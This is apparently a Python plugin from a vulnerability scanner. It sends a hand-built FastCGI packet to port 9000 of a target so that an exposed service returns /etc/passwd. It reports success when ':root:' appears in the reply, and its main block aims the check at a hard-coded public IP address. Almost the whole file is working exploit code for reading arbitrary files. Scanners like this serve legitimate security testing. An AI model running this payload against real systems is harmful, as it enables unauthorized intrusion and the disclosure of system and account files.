#!/usr/bin/env python
# encoding: utf-8
from t import T

import socket


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        timeout=3



        result = {}
        result['result']=False


        target_url='http://'+ip+':'+port
        socket.setdefaulttimeout(timeout)
        client_socket=None
        # 测试是否有leak
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((ip, 9000))
            data = """
            01 01 00 01 00 08 00 00  00 01 00 00 00 00 00 00
            01 04 00 01 00 8f 01 00  0e 03 52 45 51 55 45 53
            54 5f 4d 45 54 48 4f 44  47 45 54 0f 08 53 45 52
            56 45 52 5f 50 52 4f 54  4f 43 4f 4c 48 54 54 50
            2f 31 2e 31 0d 01 44 4f  43 55 4d 45 4e 54 5f 52
            4f 4f 54 2f 0b 09 52 45  4d 4f 54 45 5f 41 44 44
            52 31 32 37 2e 30 2e 30  2e 31 0f 0b 53 43 52 49
            50 54 5f 46 49 4c 45 4e  41 4d 45 2f 65 74 63 2f
            70 61 73 73 77 64 0f 10  53 45 52 56 45 52 5f 53
            4f 46 54 57 41 52 45 67  6f 20 2f 20 66 63 67 69
            63 6c 69 65 6e 74 20 00  01 04 00 01 00 00 00 00
            """
            data_s = ''
            for _ in data.split():
                data_s += chr(int(_, 16))
            client_socket.send(data_s)
            ret = client_socket.recv(1024)

            if ret.find(':root:') > 0:
                result['result']=True
                result['VerifyInfo'] = {}
                result['VerifyInfo']['type']='fast-cgi Vulnerability'
                result['VerifyInfo']['URL'] =target_url
                result['VerifyInfo']['payload']=data_s
                result['VerifyInfo']['result'] =ret
                result['VerifyInfo']['level'] = 'hole'


        except:
            pass

        finally:
            if client_socket is not None:
                client_socket.close()

            return result






if __name__ == '__main__':
    print P().verify(ip='58.220.22.101',port='80')